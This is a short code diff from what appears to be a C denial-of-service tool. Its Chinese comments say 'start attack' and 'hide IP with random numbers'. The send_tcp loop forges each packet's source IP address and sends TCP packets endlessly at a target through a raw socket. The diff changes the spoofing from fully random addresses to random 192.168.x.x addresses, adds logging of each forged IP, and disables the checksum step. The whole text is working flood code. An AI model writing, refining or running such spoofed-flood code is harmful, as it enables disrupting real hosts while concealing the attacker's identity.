@@ -92,11 +92,21 @@ void send_tcp(int sockfd,struct sockaddr_in *addr) {
 
 	// 填充完毕,开始攻击
 	while(1) {
-		// 用随机数隐藏IP
-		ip -> ip_src.s_addr = random();
+		char ipRangeString[25];
+		struct in_addr ipRange;
+
+
+		sprintf(ipRangeString, "192.168.%d.%d", random()%16 + 2, random()%256);
+		printf("%s\n", ipRangeString);
+		inet_aton(ipRangeString, &ipRange);
+
+		ip -> ip_src = ipRange ;
+
+		printf("IP: %s\n", inet_ntoa(ip -> ip_src));
+
 		// 自己校验头部,可有可无的头部
-		tcp -> check = check_sum((unsigned short *)tcp,
-			sizeof(struct tcphdr));
+//		tcp -> check = check_sum((unsigned short *)tcp,
+//			sizeof(struct tcphdr));
 		sendto(sockfd,buffer,head_len,0,(struct sockaddr *)addr,
 			sizeof(struct sockaddr_in));
 	}
